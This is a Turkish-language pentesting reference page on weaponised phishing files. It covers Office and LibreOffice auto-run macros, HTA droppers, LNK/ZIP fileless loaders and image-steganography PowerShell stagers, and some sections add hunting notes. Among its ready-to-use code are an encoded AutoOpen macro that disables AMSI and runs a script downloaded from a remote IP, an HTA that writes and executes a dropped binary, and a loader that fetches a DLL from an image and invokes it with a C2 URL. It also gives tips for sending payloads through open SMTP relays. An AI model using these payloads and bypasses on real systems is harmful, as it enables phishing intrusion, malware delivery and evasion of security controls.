# Phishing Dosyaları ve Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verilerini doğrular. Veri doğrulama, OfficeOpenXML standardına göre veri yapısı tanımlama biçiminde gerçekleştirilir. Veri yapısı tanımlama sırasında herhangi bir hata oluşursa analiz edilen dosya açılmaz.

Genellikle macro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve macro çalıştırma yeteneklerini korumak mümkündür.\
Örneğin, bir RTF dosyası tasarımı gereği macro desteklemez; ancak RTF olarak yeniden adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenir ve macro çalıştırabilir.\
Aynı dahili yapı ve mekanizmalar Microsoft Office Suite'in tüm yazılımları için geçerlidir (Excel, PowerPoint vb.).

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki command'i kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, uzaktaki bir template'e (File –Options –Add-ins –Manage: Templates –Go) başvuruyorsa ve bu template makrolar içeriyorsa makroları da “çalıştırabilir”.

### External Image Load

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture ve **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Şuraya gidin: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Belgeden rastgele kod çalıştırmak için makroları kullanmak mümkündür.

#### Autoload functions

Ne kadar yaygın olurlarsa AV'nin onları tespit etme olasılığı da o kadar yüksek olur.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadata'yı Manuel Olarak Kaldırma

**Dosya > Bilgi > Belgeyi Denetle > Belgeyi Denetle** yoluna gidin; bu işlem Belge Denetçisi'ni açar. **Denetle** düğmesine, ardından **Belge Özellikleri ve Kişisel Bilgiler** seçeneğinin yanındaki **Tümünü Kaldır** düğmesine tıklayın.

#### Doc Uzantısı

İşiniz bittiğinde **Tür olarak kaydet** açılır menüsünü seçin ve biçimi **`.docx`** yerine Word 97-2003 **`.doc`** olarak değiştirin.\
Bunu yapmanızın nedeni, **`.docx` içine macro'lar kaydedememeniz** ve macro etkin **`.docm`** uzantısının **çevresinde** bir **stigma** bulunmasıdır (ör. küçük resim simgesinde büyük bir `!` vardır ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, bu **legacy `.doc` uzantısı en iyi uzlaşmadır**.

#### Zararlı Macro Generator'ları

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macro'ları (Basic)

LibreOffice Writer belgeleri, macro'yu **Belgeyi Aç** etkinliğine bağlayarak Basic macro'larını gömebilir ve dosya açıldığında bunları otomatik olarak çalıştırabilir (Araçlar → Özelleştir → Etkinlikler → Belgeyi Aç → Macro…).<sup>[[1]](#references)</sup> Basit bir reverse shell macro'su şu şekilde görünür:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Çift tırnaklara (`""`) dikkat edin: LibreOffice Basic, literal tırnakları kaçışlamak için bunları kullanır; bu nedenle `...==""")` ile biten payload'lar hem iç komutu hem de Shell argümanını dengede tutar.

Delivery ipuçları:

- `.odt` olarak kaydedin ve macro'yu document event'e bağlayarak belge açıldığında hemen çalışmasını sağlayın.
- `swaks` ile e-posta gönderirken `--attach @resume.odt` kullanın (`@` işaretinin kullanılması gerekir; böylece ek olarak dosya adı dizesi değil, dosyanın byte'ları gönderilir). Bu, doğrulama yapmadan rastgele `RCPT TO` alıcılarını kabul eden SMTP sunucularını abuse ederken critical önem taşır.

## HTA Dosyaları

Bir HTA, **HTML ile scripting dillerini (VBScript ve JScript gibi) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir browser'ın security model'inin kısıtlamaları olmadan "fully trusted" bir uygulama olarak çalışır.

Bir HTA, genellikle **Internet Explorer** ile birlikte **kurulu** gelen **`mshta.exe`** kullanılarak çalıştırılır; bu da **`mshta`'yı IE'ye bağımlı** kılar. Bu nedenle IE kaldırılmışsa HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication'ı Zorlama

**"Uzaktan" NTLM authentication'ı zorlamanın** birkaç yolu vardır; örneğin kullanıcının erişeceği e-postalara veya HTML içeriklerine **görünmez görseller** ekleyebilirsiniz (HTTP MitM bile olabilir). Ya da kurbanın, yalnızca **klasörü açmasıyla** bir **authentication** işlemini **tetikleyecek** dosyaların **adreslerini** gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya authentication'ı çalamayacağınızı, aynı zamanda **NTLM relay saldırıları gerçekleştirebileceğinizi** unutmayın:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Son derece etkili kampanyalar, iki meşru yem belgesi (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Buradaki yöntem, gerçek PowerShell loader'ın ZIP'in raw byte'ları içinde benzersiz bir marker'dan sonra saklanması ve .lnk tarafından ayrıştırılarak tamamen memory içinde çalıştırılmasıdır.<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner tarafından uygulanan tipik akış:

1) Orijinal ZIP'i yaygın yollarda bulun: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve mevcut çalışma dizininin parent dizini.
2) ZIP byte'larını okuyun ve hardcoded bir marker bulun (ör. xFIQCV). Marker'dan sonraki her şey embedded PowerShell payload'ıdır.
3) ZIP'i %ProgramData% konumuna kopyalayın, orada extract edin ve meşru görünmesi için yem olarak kullanılan .docx dosyasını açın.
4) Mevcut process için AMSI'yi bypass edin: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Bir sonraki stage'in obfuscation'ını kaldırın (ör. tüm # karakterlerini kaldırın) ve bunu memory içinde execute edin.

Embedded stage'i ayırıp çalıştırmak için örnek PowerShell skeleton:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Delivery genellikle güvenilir PaaS subdomain'lerini (ör. *.herokuapp.com) kötüye kullanır ve payload'ları filtreleyebilir (IP/UA temelinde zararsız ZIP'ler sunar).
- Sonraki aşama çoğunlukla base64/XOR shellcode'un şifresini çözer ve disk üzerindeki izleri en aza indirmek için Reflection.Emit + VirtualAlloc aracılığıyla çalıştırır.

Aynı zincirde kullanılan Persistence
- Microsoft Web Browser control'ünün COM TypeLib hijacking yöntemiyle ele geçirilmesi; böylece IE/Explorer veya bunu embed eden herhangi bir uygulama payload'u otomatik olarak yeniden başlatır.<sup>[[2]](#references)[[4]](#references)</sup> Ayrıntıları ve kullanıma hazır komutları burada bulabilirsiniz:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verilerinin sonuna eklenmiş ASCII marker string'i (ör. xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için üst/parent ve kullanıcı klasörlerini tarayan ve decoy document'ı açan .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla AMSI tampering.
- Trusted PaaS domain'leri altında barındırılan linklerle sonlanan uzun süreli business thread'leri.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Yinelenen başka bir pattern, arka planda gerçek chain'i stage ederken hemen zararsız bir lure açan **document-impersonating `.lnk`** dosyasıdır.<sup>[[3]](#references)</sup>

Gözlemlenen iş akışı:
1. Shortcut **PDF gibi görünür** ve obfuscated bir PowerShell downloader'ı başlatmak için `conhost.exe` veya benzer bir proxy kullanır.
2. PowerShell, bariz token'ları (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) parçalar; böylece `iwr`, `gci`, `ren`, `cpi` veya `schtasks` arayan basit detections komutu kaçırır.
3. Stager önce **decoy document'ı indirir**, kurban için açar ve ardından malicious dosyaları arka planda yeniden oluşturur.
4. Payload'lar **junk extension'larla** yazılabilir ve ardından filler karakterleri kaldırılarak yeniden adlandırılabilir; bu da belirgin `.exe` / `.cpl` artifact'larının ortaya çıkmasını geciktirir.
5. Persistence, user-writable bir path'ten trusted host binary başlatan **minute-based scheduled task** ile sağlanır.

Bu pattern'e ait minimum hunting ipuçları:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Tanımak için yararlı bir staging düzeni şöyledir:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` veya `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### İkinci aşama neden stealthy

Rapid7 case study'de scheduled task, **`Fondue.exe`** dosyasını `C:\Users\Public\` konumundan tekrar tekrar çalıştırıyordu. **`APPWIZ.cpl`** dosyası da bunun yanına yerleştirildiği ve **`RunFODW`** export'unu sunduğu için, trusted Microsoft binary legitimate system copy yerine attacker CPL dosyasını side-load etti.

CPL daha sonra:
- `C:\Windows\Tasks\editor.dat` konumundaki bir **AES-256-CBC** blob'unu okur
- Blob'u **Windows CNG / `bcrypt.dll`** üzerinden decrypt eder
- Executable memory ayırır ve decrypt edilmiş shellcode'u kopyalar
- Shellcode pointer'ını **`EnumUILanguagesW`** için callback olarak geçirerek shellcode'u dolaylı biçimde execute eder

Bu son adım ayrıca ayrı olarak hunt edilmeye değerdir: malware çoğu zaman doğrudan `((void(*)())buf)()` jump'ı kullanmaktan kaçınır ve bunun yerine execution'ı devretmek için **meşru bir callback alan WinAPI**'yi kötüye kullanır.

Bu campaign'deki decrypt edilmiş payload, daha sonra final PE'yi tamamen memory içinde map eden ve execution'ı devretmeden önce mevcut process içinde **AMSI/WLDP/ETW**'yi patch'leyen **Donut** shellcode'uydu. Side-loading ve memory-resident post-processing hakkında daha ayrıntılı notlar için bkz.:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pratik hunting pivot'ları:
- Görünür bir decoy document ile devam eden `.lnk` dosyasının `powershell.exe` veya `conhost.exe` çalıştırması.
- **`C:\Users\Public\`** konumuna yapılan kısa ömürlü download'ların ardından nonsense extension'lardan immediate rename işlemleri.
- **user-writable directories** içinden execution yapan `GoogleErrorReport` gibi sıradan isimlere sahip scheduled task'lar.
- Aynı non-system directory içindeki **`.cpl` / `.dll`** dosyalarını yükleyen trusted binary'ler.
- **`C:\Windows\Tasks\`** altında yazılan ve ardından side-loaded module tarafından okunan Base64 text blob'ları.

## Görsellerde steganography-delimited payload'lar (PowerShell stager)

Recent loader chain'ler, obfuscated bir JavaScript/VBS dosyası deliver eder. Bu dosya, embedded Base64'ü decode eder ve bir Base64 PowerShell stager çalıştırır. Bu stager bir image (çoğunlukla GIF) download eder. Image, unique start/end marker'ları arasında plain text olarak gizlenmiş Base64-encoded bir .NET DLL içerir. Script bu delimiter'ları arar (wild'da görülen örnekler: «<<sudo_png>> … <<sudo_odt>>>»), aradaki text'i extract eder, Base64-decode ederek byte'lara dönüştürür, assembly'yi memory içinde load eder ve bilinen bir entry method'u C2 URL'siyle invoke eder.<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64'ü decode eder → `-nop -w hidden -ep bypass` seçenekleriyle PowerShell stager'ı çalıştırır.
- Stage 2: PowerShell stager → image download eder, marker-delimited Base64'ü carve eder, .NET DLL'yi memory içinde load eder ve C2 URL'si ile seçenekleri method'a geçirerek bu method'u çağırır (ör. VAI).
- Stage 3: Loader final payload'u alır ve genellikle trusted bir binary'ye (yaygın olarak MSBuild.exe) process hollowing yoluyla inject eder.<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing ve trusted utility proxy execution hakkında daha fazla bilgi için:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Bir image'dan DLL carve etmek ve memory içinde bir .NET method'u invoke etmek için PowerShell örneği:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu, ATT&CK T1027.003'tür (steganography/marker-hiding).<sup>[[6]](#references)</sup> Marker'lar campaign'ler arasında değişiklik gösterir.
- Assembly yüklenmeden önce AMSI/ETW bypass ve string deobfuscation yaygın olarak uygulanır.
- Hunting: indirilen image'ları bilinen delimiter'lar için tarayın; image'lara erişen ve hemen ardından Base64 blob'larını decode eden PowerShell'i tespit edin.

Ayrıca stego tools ve carving tekniklerine bakın:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Yaygın bir initial stage, bir archive içinde teslim edilen küçük ve yoğun şekilde obfuscate edilmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı, gömülü bir Base64 string'ini decode etmek ve HTTPS üzerinden sonraki stage'i başlatmak için `-nop -w hidden -ep bypass` parametreleriyle PowerShell'i çalıştırmaktır.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Kendi file içeriğini oku
- Junk string'ler arasındaki Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `powershell.exe`'yi çağırarak `wscript.exe`/`cscript.exe` ile çalıştır

Hunting ipuçları
- Komut satırında `-enc`/`FromBase64String` ile `powershell.exe` başlatan arşivlenmiş JS/VBS attachment'ları.
- User temp path'lerinden `powershell.exe -nop -w hidden` başlatan `wscript.exe`.

## NTLM hash'lerini çalmak için Windows dosyaları

**NTLM creds çalınabilecek yerler** hakkındaki sayfaya bakın:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine campaign'i: ABD şirketlerini hedefleyen gelişmiş bir phishing saldırısı](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Çin temalı bir loader chain üzerinden Dropping Elephant tradecraft'ını izleme](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLib'i hijack etme – Yeni COM persistence tekniği (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader çeşitli infostealer'lar teslim ediyor](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
